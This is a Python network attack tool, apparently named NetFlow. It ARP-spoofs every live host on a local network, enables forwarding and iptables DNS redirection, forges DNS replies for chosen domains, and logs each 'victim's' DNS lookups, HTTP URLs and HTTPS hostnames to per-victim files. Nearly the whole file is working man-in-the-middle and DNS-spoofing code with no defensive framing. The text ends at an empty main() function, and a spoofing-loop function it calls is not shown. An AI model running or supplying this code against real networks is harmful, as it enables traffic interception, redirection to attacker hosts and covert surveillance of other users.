#!/usr/bin/env python3
import os
import sys
import threading
import time
import signal
import subprocess
import re
from scapy.all import *

from scapy.layers.tls.all import TLSClientHello
from scapy.layers.tls.extensions import TLS_Ext_ServerName

from optparse import OptionParser
import netifaces
from collections import defaultdict


iface = None
gateway_ip = None
gateway_mac = None
our_ip = None
our_mac = None
targets = {}
spoof_domains = {}
stop_event = threading.Event()
dns_mitm_log_file = "dns_mitm_actions.log" 


LOGS_DIR = "logs"
general_http_https_log_file = os.path.join(LOGS_DIR, "general_http_https_traffic.log")
all_dns_traffic_summary_log_file = os.path.join(LOGS_DIR, "all_dns_traffic_summary_sorted.log")
victim_log_files = {} 



total_packets_sniffed = 0
unique_src_ips = set()
unique_dst_ips = set()
http_hosts_logged = set()
https_hosts_logged = set()
http_urls_logged = set()


dns_traffic_log = defaultdict(lambda: defaultdict(set)) 


COLOR_RESET = "\033[0m"
COLOR_BOLD = "\033[1m"
COLOR_RED = "\033[31m"
COLOR_GREEN = "\033[32m"
COLOR_YELLOW = "\033[33m"
COLOR_BLUE = "\033[34m"
COLOR_MAGENTA = "\033[35m"
COLOR_CYAN = "\033[36m" 
COLOR_WHITE = "\033[37m"

COLOR_PALETTE = [ 
    COLOR_RED,
    COLOR_GREEN,
    COLOR_YELLOW,
    COLOR_BLUE,
    COLOR_MAGENTA,
    COLOR_CYAN,
    COLOR_WHITE,
]



ip_color_map = {}
color_index = 0


runtime_highlight_domains = set()


def display_banner():
    """Displays the NetFlow project banner with scary emojis and correct ASCII art."""
    print(f"""
{COLOR_BOLD}{COLOR_RED}
   👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 
{COLOR_CYAN}

                                                                                                                                                                
                                                                                                                                                                
NNNNNNNN        NNNNNNNN                             tttt               FFFFFFFFFFFFFFFFFFFFFFlllllll                                                           
N:::::::N       N::::::N                          ttt:::t               F::::::::::::::::::::Fl:::::l                                                           
N::::::::N      N::::::N                          t:::::t               F::::::::::::::::::::Fl:::::l                                                           
N:::::::::N     N::::::N                          t:::::t               FF::::::FFFFFFFFF::::Fl:::::l                                                           
N::::::::::N    N::::::N    eeeeeeeeeeee    ttttttt:::::ttttttt           F:::::F       FFFFFF l::::l    ooooooooooo   wwwwwww           wwwww           wwwwwww
N:::::::::::N   N::::::N  ee::::::::::::ee  t:::::::::::::::::t           F:::::F              l::::l  oo:::::::::::oo  w:::::w         w:::::w         w:::::w 
N:::::::N::::N  N::::::N e::::::eeeee:::::eet:::::::::::::::::t           F::::::FFFFFFFFFF    l::::l o:::::::::::::::o  w:::::w       w:::::::w       w:::::w  
N::::::N N::::N N::::::Ne::::::e     e:::::etttttt:::::::tttttt           F:::::::::::::::F    l::::l o:::::ooooo:::::o   w:::::w     w:::::::::w     w:::::w   
N::::::N  N::::N:::::::Ne:::::::eeeee::::::e      t:::::t                 F:::::::::::::::F    l::::l o::::o     o::::o    w:::::w   w:::::w:::::w   w:::::w    
N::::::N   N:::::::::::Ne:::::::::::::::::e       t:::::t                 F::::::FFFFFFFFFF    l::::l o::::o     o::::o     w:::::w w:::::w w:::::w w:::::w     
N::::::N    N::::::::::Ne::::::eeeeeeeeeee        t:::::t                 F:::::F              l::::l o::::o     o::::o      w:::::w:::::w   w:::::w:::::w      
N::::::N     N:::::::::Ne:::::::e                 t:::::t    tttttt       F:::::F              l::::l o::::o     o::::o       w:::::::::w     w:::::::::w       
N::::::N      N::::::::Ne::::::::e                t::::::tttt:::::t     FF:::::::FF           l::::::lo:::::ooooo:::::o        w:::::::w       w:::::::w        
N::::::N       N:::::::N e::::::::eeeeeeee        tt::::::::::::::t     F::::::::FF           l::::::lo:::::::::::::::o         w:::::w         w:::::w         
N::::::N        N::::::N  ee:::::::::::::e          tt:::::::::::tt     F::::::::FF           l::::::l oo:::::::::::oo           w:::w           w:::w          
NNNNNNNN         NNNNNNN    eeeeeeeeeeeeee            ttttttttttt       FFFFFFFFFFF           llllllll   ooooooooooo              www             www           
                                                                                                                                                                
                                                                                             
{COLOR_RED}
   👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 💀 👻 
{COLOR_RESET}
    Version: 1.0.0
    By: Pranit Thorat
    GitHub: https://github.com/PranitThorat
{COLOR_RESET}
    """)


def ensure_logs_dir():
    """Ensures the logs directory exists."""
    if not os.path.exists(LOGS_DIR):
        os.makedirs(LOGS_DIR)
        print(f"[*] Created logs directory: {LOGS_DIR}")

def is_highlight_domain(domain_name):
    """Checks if a domain name (or its parent) should be highlighted from runtime_highlight_domains."""
    for hl_domain in runtime_highlight_domains:
       
        if domain_name == hl_domain or domain_name.endswith("." + hl_domain):
            return True
    return False


def get_my_ip(interface):
    """
    Gets the IP address of the specified interface.
    """
    try:
        addrs = netifaces.ifaddresses(interface)
        if netifaces.AF_INET in addrs:
            return addrs[netifaces.AF_INET][0]['addr']
    except Exception as e:
        print(f"[-] Could not get IP for interface {interface}: {e}")
    return None

def enable_ip_forwarding():
    """
    Enables IP forwarding on the system and adds iptables rules for DNS redirection.
    """
    try:
        if os.name == 'posix':
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True, capture_output=True)
            print("[*] IP forwarding enabled (Linux).")

            subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", iface, "-p", "udp", "--dport", "53", "-j", "REDIRECT", "--to-ports", "53"], check=True)
            print(f"[*] IPTABLES: All UDP/53 traffic on {iface} redirected to local machine.")

            subprocess.run(["iptables", "-A", "FORWARD", "-i", iface, "-o", iface, "-j", "ACCEPT"], check=True)
            print(f"[*] IPTABLES: FORWARD chain rule added for {iface} (allowing traffic between hosts).")

        elif os.name == 'nt':
            print("[!] IP forwarding for Windows needs manual configuration via registry or PowerShell with admin rights.")
            print("[!] Please ensure IP forwarding is enabled manually if on Windows.")
        else:
            print("[!] IP forwarding enabling not implemented for this OS.")
    except Exception as e:
        print(f"[-] Error enabling IP forwarding/iptables: {e}")
        print("[-] Please ensure you run this script with appropriate administrator/root privileges.")

def disable_ip_forwarding():
    """
    Disables IP forwarding on the system and removes the iptables rules.
    """
    try:
        if os.name == 'posix':
            subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-i", iface, "-p", "udp", "--dport", "53", "-j", "REDIRECT", "--to-ports", "53"], check=True)
            print("[*] IPTABLES: Removed UDP/53 traffic redirection rule.")
            subprocess.run(["iptables", "-D", "FORWARD", "-i", iface, "-o", iface, "-j", "ACCEPT"], check=True)
            print("[*] IPTABLES: Removed FORWARD chain rule.")

            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], check=True, capture_output=True)
            print("[*] IP forwarding disabled (Linux).")
        elif os.name == 'nt':
            print("[!] Remember to manually disable IP forwarding if you enabled it on Windows.")
        else:
            print("[!] IP forwarding disabling not implemented for this OS.")
    except Exception as e:
        print(f"[-] Error disabling IP forwarding/iptables: {e}")
        print("[-] Manual intervention might be needed to reset IP forwarding and iptables.")


def get_mac(ip):
    """Retrieves the MAC address for a given IP using ARP request."""
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=2, verbose=False, iface=iface)
        if ans:
            return ans[0][1].hwsrc
        return None
    except Exception as e:
        print(f"[-] Error getting MAC for {ip}: {e}")
        return None

def arp_spoof(target_ip, target_mac, spoof_ip):
    """Sends a spoofed ARP response."""
    ether_frame = Ether(src=our_mac, dst=target_mac)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op='is-at')
    sendp(ether_frame / arp_response, verbose=False, iface=iface)

def restore_arp(target_ip, target_mac, source_ip, source_mac):
    """Restores the ARP table entry for a specific IP."""
    ether_frame_to_target = Ether(src=source_mac, dst=target_mac)
    arp_response_to_target = ARP(pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac, op='is-at')
    sendp(ether_frame_to_target / arp_response_to_target, count=5, verbose=False, iface=iface)

    print(f"[*] Sent ARP restoration for {target_ip} (telling it {source_ip} is at {source_mac})")


def log_to_file(filename, message):
    """Logs messages to a specified file with a timestamp."""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    with open(filename, "a") as f:
        f.write(f"[{timestamp}] {message}\n")

def get_ip_color(ip):
    """Assigns and returns a consistent color for a given IP address."""
    global color_index
    if ip not in ip_color_map:
        ip_color_map[ip] = COLOR_PALETTE[color_index % len(COLOR_PALETTE)]
        color_index += 1
    return ip_color_map[ip]

def dns_spoof_packet_handler(pkt):
    """
    Callback function for sniffing in DNS MITM mode.
    Handles DNS queries and performs spoofing. Also forwards non-spoofed packets.
    """
    global total_packets_sniffed, unique_src_ips, unique_dst_ips

    total_packets_sniffed += 1
    if pkt.haslayer(IP):
        unique_src_ips.add(pkt[IP].src)
        unique_dst_ips.add(pkt[IP].dst)

    if pkt.haslayer(DNSQR) and pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt[UDP].dport == 53 and pkt[DNS].qr == 0:
        qname = pkt[DNSQR].qname.decode().strip('.')
        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst

        if src_ip in targets and (dst_ip == gateway_ip or dst_ip == our_ip):
            spoofed_found = False
            for domain in spoof_domains:
                if domain in qname:
                    spoof_ip = spoof_domains[domain]
                    log_to_file(dns_mitm_log_file, f"Spoofing DNS response for {qname} -> {spoof_ip} (Victim: {src_ip})")

                    qname_display = qname
                    if is_highlight_domain(qname):
                        qname_display = f"{COLOR_BOLD}{qname}{COLOR_RESET}"

                    print(f"[+] Spoofing DNS response for {qname_display} -> {spoof_ip} (Victim: {src_ip})")

                    spoofed_pkt = IP(dst=src_ip, src=our_ip) / \
                                  UDP(dport=pkt[UDP].sport, sport=53) / \
                                  DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                      an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoof_ip))

                    sendp(Ether(src=our_mac, dst=targets[src_ip]) / spoofed_pkt, verbose=False, iface=iface)
                    spoofed_found = True
                    break

            if spoofed_found:
                return

    forward_packet(pkt)

def forward_packet(pkt):
    """
    Forwards packets received during MITM.
    Rewrites Ethernet MAC addresses to ensure proper routing.
    """
    if pkt.haslayer(Ether):
        src_mac_incoming = pkt[Ether].src
        dst_mac_incoming = pkt[Ether].dst

        if src_mac_incoming in targets.values() and dst_mac_incoming == our_mac:
            pkt[Ether].dst = gateway_mac
            pkt[Ether].src = our_mac
            sendp(pkt, iface=iface, verbose=False)
        elif src_mac_incoming == gateway_mac and dst_mac_incoming == our_mac:
            if pkt.haslayer(IP) and pkt[IP].dst in targets:
                target_mac_for_pkt = targets[pkt[IP].dst]
                pkt[Ether].dst = target_mac_for_pkt
                pkt[Ether].src = our_mac
                sendp(pkt, iface=iface, verbose=False)
            else:
                if pkt.haslayer(IP):
                 
                    log_to_file(dns_mitm_log_file, f"Warning: Forwarded non-targeted packet from gateway. DST IP: {pkt[IP].dst}. Packet: {pkt.summary()}")
                else:
                    log_to_file(dns_mitm_log_file, f"Warning: Forwarded non-IP packet from gateway. Packet: {pkt.summary()}")
                sendp(pkt, iface=iface, verbose=False)
        else:
            sendp(pkt, iface=iface, verbose=False)
    else:
        send(pkt, verbose=False)


def passive_traffic_monitor_packet_handler(pkt):
    """
    Callback function for sniffing in passive mode.
    Logs HTTP/HTTPS hostnames and HTTP URLs.
    """
    global total_packets_sniffed, unique_src_ips, unique_dst_ips
    global http_hosts_logged, https_hosts_logged, http_urls_logged

    total_packets_sniffed += 1
    if pkt.haslayer(IP):
        unique_src_ips.add(pkt[IP].src)
        unique_dst_ips.add(pkt[IP].dst)

    if pkt.haslayer(Raw) and pkt.haslayer(TCP) and (pkt[TCP].dport == 80 or pkt[TCP].sport == 80):
        try:
            http_payload = pkt[Raw].load.decode('utf-8', errors='ignore')
            if "GET /" in http_payload:
                match_host = re.search(r"Host: (.*?)\r\n", http_payload)
                match_path = re.search(r"GET (.*?) HTTP", http_payload)

                host = match_host.group(1) if match_host else "Unknown Host"
                path = match_path.group(1) if match_path else "Unknown Path"

                full_url = f"http://{host}{path}"
                if full_url not in http_urls_logged:
                    print(f"[HTTP URL] From {get_ip_color(pkt[IP].src)}{pkt[IP].src}{COLOR_RESET}: {full_url}")
                    log_to_file(general_http_https_log_file, f"[HTTP URL] From {pkt[IP].src}: {full_url}")
                    http_urls_logged.add(full_url)
                if host not in http_hosts_logged:
                    print(f"[HTTP Host] From {get_ip_color(pkt[IP].src)}{pkt[IP].src}{COLOR_RESET}: {host}")
                    log_to_file(general_http_https_log_file, f"[HTTP Host] From {pkt[IP].src}: {host}")
                    http_hosts_logged.add(host)

            elif "POST /" in http_payload:
                match_host = re.search(r"Host: (.*?)\r\n", http_payload)
                host = match_host.group(1) if match_host else "Unknown Host"
                if host not in http_hosts_logged:
                    print(f"[HTTP POST Host] From {get_ip_color(pkt[IP].src)}{pkt[IP].src}{COLOR_RESET}: {host}")
                    log_to_file(general_http_https_log_file, f"[HTTP POST Host] From {pkt[IP].src}: {host}")
                    http_hosts_logged.add(host)

        except (UnicodeDecodeError, AttributeError):
            pass

    elif pkt.haslayer(TLSClientHello) and pkt.haslayer(TCP) and pkt[TCP].dport == 443:
        try:
            server_name_extension = None
            for ext in pkt[TLSClientHello].extensions:
                if isinstance(ext, TLS_Ext_ServerName):
                    server_name_extension = ext
                    break

            if server_name_extension:
                for name_type, server_name in server_name_extension.names:
                    if name_type == 0:
                        hostname = server_name.decode('utf-8', errors='ignore')
                        if hostname not in https_hosts_logged:
                            print(f"[HTTPS Host] From {get_ip_color(pkt[IP].src)}{pkt[IP].src}{COLOR_RESET}: {hostname}")
                            log_to_file(general_http_https_log_file, f"[HTTPS Host] From {pkt[IP].src}: {hostname}")
                            https_hosts_logged.add(hostname)
        except Exception:
            pass

def dns_traffic_monitor_packet_handler(pkt):
    """
    Callback function for sniffing in DNS Traffic Monitor mode.
    Logs domain visits and resolved IPs, categorized by victim IP.
    This handler expects to receive all traffic due to ARP spoofing.
    """
    global total_packets_sniffed, unique_src_ips, unique_dst_ips
    global dns_traffic_log

    total_packets_sniffed += 1
    if pkt.haslayer(IP):
        unique_src_ips.add(pkt[IP].src)
        unique_dst_ips.add(pkt[IP].dst)

    if pkt.haslayer(DNS) and pkt[DNS].qr == 1 and pkt[DNS].ancount > 0 and pkt.haslayer(IP):
        victim_ip = pkt[IP].dst

        if victim_ip == our_ip or victim_ip in targets:
            try:
             
                if victim_ip not in victim_log_files:
                    victim_filename = os.path.join(LOGS_DIR, f"victim_dns_traffic_{victim_ip}.log")
                    try:
                        victim_log_files[victim_ip] = open(victim_filename, "a")
                        print(f"[*] Created new victim-specific DNS log: '{victim_filename}'")
                    except IOError as e:
                        print(f"[-] Error opening log file for {victim_ip}: {e}. Skipping victim-specific logging.")
                       
                        victim_log_files[victim_ip] = None
                        return 

                for i in range(pkt[DNS].ancount):
                    ans_rr = pkt[DNS].an[i]
                    if ans_rr.type == 1:
                        domain = ans_rr.rrname.decode().strip('.')
                        resolved_ip = ans_rr.rdata

                        if resolved_ip and resolved_ip != '0.0.0.0':
                            dns_traffic_log[victim_ip][domain].add(resolved_ip)
                            
                           
                            ip_color = get_ip_color(victim_ip)

                            domain_display = domain
                            resolved_ip_display = resolved_ip

                            if is_highlight_domain(domain):
                              
                                domain_display = f"{COLOR_BOLD}{domain}{COLOR_RESET}{ip_color}"
                                resolved_ip_display = f"{COLOR_BOLD}{resolved_ip}{COLOR_RESET}{ip_color}"

                           
                            log_message_console = (f"Victim: {victim_ip} requested: {domain_display} -> resolved to: {resolved_ip_display}")
                            
                  
                            print(f"{ip_color}[DNS Visit] {log_message_console}{COLOR_RESET}")
                        
                            if victim_log_files[victim_ip]:
                                timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                                log_message_file_content = f"[{timestamp}] [DNS Visit] Victim: {victim_ip} requested: {domain} -> resolved to: {resolved_ip}"
                                victim_log_files[victim_ip].write(f"{log_message_file_content}\n")
                                victim_log_files[victim_ip].flush() 
            except Exception as e:

                pass 

    forward_packet(pkt)


def scan_network(ip_range):
    """Scans the given IP range for live hosts using ARP ping."""
    print(f"[*] Scanning network {ip_range} for live hosts...")
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_range), timeout=3, verbose=False, iface=iface)
    live_hosts = {}
    for sent, received in ans:
        live_hosts[received.psrc] = received.hwsrc
    return live_hosts

def select_interface():
    """Allows the user to select a network interface from a list."""
    interfaces = netifaces.interfaces()
    print("Available network interfaces:")
    valid_interfaces = []
    for i, iface_name in enumerate(interfaces, 1):
        try:
            addrs = netifaces.ifaddresses(iface_name)
            if netifaces.AF_INET in addrs:
                print(f"{len(valid_interfaces) + 1}. {iface_name} ({addrs[netifaces.AF_INET][0]['addr']})")
                valid_interfaces.append(iface_name)
        except ValueError:
            pass

    if not valid_interfaces:
        print("[-] No valid network interfaces with IPv4 addresses found. Exiting.")
        sys.exit(1)

    while True:
        choice = input("Select interface by number: ")
        if choice.isdigit() and 1 <= int(choice) <= len(valid_interfaces):
            return valid_interfaces[int(choice) - 1]
        else:
            print("Invalid choice. Try again.")

def get_gateway_ip(iface_name):
    """Retrieves the default gateway IP for the specified interface."""
    gws = netifaces.gateways()
    default_gateway = gws.get('default', {})
    if netifaces.AF_INET in default_gateway:
        gw_ip, gw_iface = default_gateway[netifaces.AF_INET]
        if gw_iface == iface_name:
            return gw_ip

    for gw_family in gws:
        if isinstance(gws[gw_family], list):
            for gw_ip_info in gws[gw_family]:
                if len(gw_ip_info) > 1 and gw_ip_info[1] == iface_name:
                    return gw_ip_info[0]
    return None

def signal_handler(sig, frame):
    """Handles Ctrl+C to gracefully restore network and exit."""
    print("\n[!] Detected CTRL+C! Cleaning up and restoring network...")
    stop_event.set()

    time.sleep(1)

    if 'mitm_active' in globals() and mitm_active:
        print("[*] Restoring ARP tables...")
        for target_ip, target_mac in targets.items():
            print(f"[*] Restoring ARP for {target_ip}...")
            restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)
            restore_arp(gateway_ip, gateway_mac, target_ip, target_mac)
        disable_ip_forwarding()
    else:
        print("[*] No ARP spoofing or IP forwarding to restore (passive mode).")

    print("[*] Closing victim-specific DNS log files...")
    for ip, f_obj in victim_log_files.items():
        if f_obj: 
            f_obj.close()
            print(f"[*] Closed log for {ip}.")
    print("[*] Victim-specific DNS log files closed.")

    print("[*] Generating traffic summary and combined DNS log...")
    generate_traffic_summary()

    print("[*] Cleanup complete. Exiting.")
    sys.exit(0)

def generate_traffic_summary():
    """Prints a summary of the captured traffic and generates combined DNS log."""
    print("\n--- Traffic Summary ---")
    print(f"Total Packets Sniffed: {total_packets_sniffed}")
    print(f"Unique Source IPs: {len(unique_src_ips)}")
    for ip in unique_src_ips:
        print(f"  - {ip}")
    print(f"Unique Destination IPs: {len(unique_dst_ips)}")
    for ip in unique_dst_ips:
        print(f"  - {ip}")

    if http_hosts_logged:
        print(f"\nHTTP Hosts Logged ({len(http_hosts_logged)} unique):")
        for host in http_hosts_logged:
            print(f"  - {host}")
    if http_urls_logged:
        print(f"\nHTTP URLs Logged ({len(http_urls_logged)} unique):")
        for url in http_urls_logged:
            print(f"  - {url}")
    if https_hosts_logged:
        print(f"\nHTTPS Hosts Logged (SNI) ({len(https_hosts_logged)} unique):")
        for host in https_hosts_logged:
            print(f"  - {host}")

    if dns_traffic_log:
        print(f"\nDNS Traffic Log ({len(dns_traffic_log)} unique victims):")
        if runtime_highlight_domains:
            print(f"  (Domains configured for highlighting: {', '.join(sorted(list(runtime_highlight_domains)))})")

      
        combined_dns_entries = []
        for victim_ip, domains_data in dns_traffic_log.items():
            for domain, resolved_ips in domains_data.items():
                combined_dns_entries.append({
                    'victim_ip': victim_ip,
                    'domain': domain,
                    'resolved_ips': sorted(list(resolved_ips)) 
                })

       
        combined_dns_entries.sort(key=lambda x: x['domain'])

    
        try:
            with open(all_dns_traffic_summary_log_file, "w") as f_all:
                f_all.write(f"--- Combined DNS Traffic Summary Log ({time.strftime('%Y-%m-%d %H:%M:%S')}) ---\n")
                if runtime_highlight_domains:
                    f_all.write(f"Domains configured for highlighting: {', '.join(sorted(list(runtime_highlight_domains)))}\n\n")

                last_domain_written = None 

                for entry in combined_dns_entries:
                    victim_ip = entry['victim_ip']
                    domain = entry['domain']
                    resolved_ips = entry['resolved_ips']

                    if domain != last_domain_written:
                        f_all.write(f"\nDomain: {domain}\n")
                        last_domain_written = domain
                    
                    f_all.write(f"  - Victim: {victim_ip} -> Resolved IPs: {', '.join(resolved_ips)}\n")
            print(f"[*] All DNS traffic summary saved to '{all_dns_traffic_summary_log_file}'.")
        except IOError as e:
            print(f"[-] Error writing to combined DNS summary log file: {e}")

        
        for victim_ip, domains_data in dns_traffic_log.items():
            ip_color = get_ip_color(victim_ip)
            print(f"  {ip_color}Victim IP: {victim_ip}{COLOR_RESET}")
            for domain, resolved_ips in domains_data.items():
                domain_display = domain
                resolved_ips_display_list = []
                
                for res_ip in sorted(list(resolved_ips)):
                    
                    if is_highlight_domain(domain):
                        resolved_ips_display_list.append(f"{COLOR_BOLD}{res_ip}{COLOR_RESET}{ip_color}")
                    else:
                        resolved_ips_display_list.append(res_ip)

               
                if is_highlight_domain(domain):
                    domain_display = f"{COLOR_BOLD}{domain}{COLOR_RESET}{ip_color}"
                
                print(f"    - Domain: {domain_display} -> Resolved IPs: {', '.join(resolved_ips_display_list)}")
    print("-----------------------")


def run_dns_mitm_mode():
    """Executes the DNS Spoofing (MITM) functionality."""
    global iface, gateway_ip, gateway_mac, our_ip, our_mac, targets, spoof_domains, mitm_active
    global total_packets_sniffed, unique_src_ips, unique_dst_ips, runtime_highlight_domains

    mitm_active = True

    print("\n--- DNS Spoofing (MITM Mode) ---")

    spoof_input = input("Enter domains to spoof (format: domain:ip,domain2:ip2): ")
    if not spoof_input:
        print("[-] No spoof domains specified. Returning to main menu.")
        return

    try:
        spoof_domains = dict(item.split(":") for item in spoof_input.split(","))
        for domain, ip in spoof_domains.items():
            if not re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip):
                raise ValueError(f"Invalid IP address format for {domain}: {ip}")
    except Exception as e:
        print(f"[-] Error parsing spoof domains: {e}. Format should be domain:ip,domain2:ip2")
        return

    print(f"[*] Spoofing domains: {spoof_domains}")

   
    highlight_input = input("Enter domains to highlight (comma-separated, e.g., google.com,youtube.com, optional): ").strip()
    if highlight_input:
        runtime_highlight_domains.clear() 
        runtime_highlight_domains.update({d.strip().lower() for d in highlight_input.split(',')})
        print(f"[*] Domains set for highlighting in this session: {', '.join(sorted(list(runtime_highlight_domains)))}")
    else:
        runtime_highlight_domains.clear() 
        print("[*] No specific domains set for highlighting in this session.")


    our_ip = get_my_ip(iface)
    if not our_ip:
        print(f"[-] Could not get our IP address for {iface}. Exiting.")
        return
    our_mac = get_if_hwaddr(iface)
    print(f"[*] Our IP: {our_ip}")
    print(f"[*] Our MAC: {our_mac}")

    gateway_ip = get_gateway_ip(iface)
    if not gateway_ip:
        print("[-] Could not find gateway IP for interface. Exiting.")
        return
    print(f"[*] Gateway IP: {gateway_ip}")

    gateway_mac = get_mac(gateway_ip)
    if not gateway_mac:
        print("[-] Could not get gateway MAC address. Make sure gateway is reachable. Exiting.")
        return
    print(f"[*] Gateway MAC: {gateway_mac}")

    netmask = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['netmask']
    netmask_parts = [int(x) for x in netmask.split('.')]
    cidr_prefix = sum(bin(x).count('1') for x in netmask_parts)
    ip_parts = [int(x) for x in our_ip.split('.')]
    network_parts = [str(ip_parts[i] & netmask_parts[i]) for i in range(4)]
    network_address = '.'.join(network_parts)
    ip_range = f"{network_address}/{cidr_prefix}"
    print(f"[*] Scanning network range: {ip_range}")

    all_live_hosts = scan_network(ip_range)
    targets.clear()
    for ip, mac in all_live_hosts.items():
        if ip != our_ip and ip != gateway_ip:
            targets[ip] = mac

    if not targets:
        print("[-] No other live hosts found on the network (excluding self and gateway). Returning to main menu.")
        return

    print(f"[*] Found {len(targets)} live hosts to target:")
    for ip, mac in targets.items():
        print(f" - {ip} ({mac})")

    print("[*] Enabling IP forwarding...")
    enable_ip_forwarding()

    print("[*] Starting ARP spoofing thread...")
    thread = threading.Thread(target=spoof_loop, name="ARPSpoofThread")
    thread.daemon = True
    thread.start()

    total_packets_sniffed = 0
    unique_src_ips.clear()
    unique_dst_ips.clear()

    print("[*] Starting DNS spoofing sniff (listening for UDP port 53 traffic)...")
    print("[*] Press Ctrl+C to stop and restore network.")
    sniff(filter="udp port 53", prn=dns_spoof_packet_handler, iface=iface, store=0, stop_filter=lambda p: stop_event.is_set())

    print("[*] Sniffing stopped.")


def run_passive_monitoring_mode():
    """Executes the HTTP/HTTPS Hostname & URL Logging functionality."""
    global total_packets_sniffed, unique_src_ips, unique_dst_ips
    global http_hosts_logged, https_hosts_logged, http_urls_logged
    global mitm_active
    global ip_color_map, color_index, runtime_highlight_domains

    mitm_active = False

    print("\n--- HTTP/HTTPS Hostname & URL Logging (Passive Mode) ---")
    print("[*] Listening for HTTP (port 80) and HTTPS (port 443 - SNI) traffic.")
    print("[*] Note: This does NOT decrypt HTTPS traffic or capture full HTTP POST data/credentials.")
    print("[*] On switched networks, this will primarily show your system's traffic unless ARP spoofing is active elsewhere.")
    print("[*] Press Ctrl+C to stop and view summary.")

    
    runtime_highlight_domains.clear()

    total_packets_sniffed = 0
    unique_src_ips.clear()
    unique_dst_ips.clear()
    http_hosts_logged.clear()
    https_hosts_logged.clear()
    http_urls_logged.clear()
    dns_traffic_log.clear() 
    ip_color_map.clear()
    color_index = 0

    sniff_filter = "tcp port 80 or tcp port 443"
    sniff(filter=sniff_filter, prn=passive_traffic_monitor_packet_handler, iface=iface, store=0, stop_filter=lambda p: stop_event.is_set())

    print("[*] Sniffing stopped.")

def run_dns_traffic_monitor_active_mitm_mode():
    """
    Executes the DNS Traffic Monitor (Active MITM Mode) functionality.
    Performs ARP spoofing to capture victim DNS traffic.
    """
    global iface, gateway_ip, gateway_mac, our_ip, our_mac, targets
    global total_packets_sniffed, unique_src_ips, unique_dst_ips
    global dns_traffic_log
    global mitm_active, ip_color_map, color_index, runtime_highlight_domains

    mitm_active = True

    print("\n--- DNS Traffic Monitor (Active MITM Mode) ---")
    print("[*] This mode will perform ARP spoofing to capture all DNS traffic from selected targets.")
    print("[*] Logging domains visited and their resolved IPs, categorized by victim IP.")
    print(f"[*] Victim-specific DNS logs will be saved in: {LOGS_DIR}/victim_dns_traffic_[VICTIM_IP].log")
    print(f"[*] A combined, sorted DNS summary will be saved in: {LOGS_DIR}/all_dns_traffic_summary_sorted.log")


    
    highlight_input = input("Enter domains to highlight (comma-separated, e.g., google.com,youtube.com, optional): ").strip()
    if highlight_input:
        runtime_highlight_domains.clear() 
        runtime_highlight_domains.update({d.strip().lower() for d in highlight_input.split(',')})
        print(f"[*] Domains set for highlighting in this session: {', '.join(sorted(list(runtime_highlight_domains)))}")
    else:
        runtime_highlight_domains.clear() 
        print("[*] No specific domains set for highlighting in this session.")


    our_ip = get_my_ip(iface)
    if not our_ip:
        print(f"[-] Could not get our IP address for {iface}. Exiting.")
        return
    our_mac = get_if_hwaddr(iface)
    print(f"[*] Our IP: {our_ip}")
    print(f"[*] Our MAC: {our_mac}")

    gateway_ip = get_gateway_ip(iface)
    if not gateway_ip:
        print("[-] Could not find gateway IP for interface. Exiting.")
        return
    print(f"[*] Gateway IP: {gateway_ip}")

    gateway_mac = get_mac(gateway_ip)
    if not gateway_mac:
        print("[-] Could not get gateway MAC address. Make sure gateway is reachable. Exiting.")
        return
    print(f"[*] Gateway MAC: {gateway_mac}")

    netmask = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['netmask']
    netmask_parts = [int(x) for x in netmask.split('.')]
    cidr_prefix = sum(bin(x).count('1') for x in netmask_parts)
    ip_parts = [int(x) for x in our_ip.split('.')]
    network_parts = [str(ip_parts[i] & netmask_parts[i]) for i in range(4)]
    network_address = '.'.join(network_parts)
    ip_range = f"{network_address}/{cidr_prefix}"
    print(f"[*] Scanning network range: {ip_range}")

    all_live_hosts = scan_network(ip_range)
    targets.clear()
    for ip, mac in all_live_hosts.items():
        if ip != our_ip and ip != gateway_ip:
            targets[ip] = mac

    if not targets:
        print("[-] No other live hosts found on the network (excluding self and gateway). Returning to main menu.")
        return

    print(f"[*] Found {len(targets)} live hosts to target:")
    for ip, mac in targets.items():
        print(f" - {ip} ({mac})")

    print("[*] Enabling IP forwarding...")
    enable_ip_forwarding()

    print("[*] Starting ARP spoofing thread...")
    thread = threading.Thread(target=spoof_loop, name="ARPSpoofThread")
    thread.daemon = True
    thread.start()

    
    total_packets_sniffed = 0
    unique_src_ips.clear()
    unique_dst_ips.clear()
    dns_traffic_log.clear()
    ip_color_map.clear()
    color_index = 0
    
    for ip, f_obj in victim_log_files.items():
        if f_obj: f_obj.close()
    victim_log_files.clear()


    print("[*] Starting DNS traffic monitor sniff (listening for UDP port 53 traffic)...")
    print("[*] Press Ctrl+C to stop and restore network.")
    sniff(filter="udp port 53", prn=dns_traffic_monitor_packet_handler, iface=iface, store=0, stop_filter=lambda p: stop_event.is_set())

    print("[*] Sniffing stopped.")


def main():
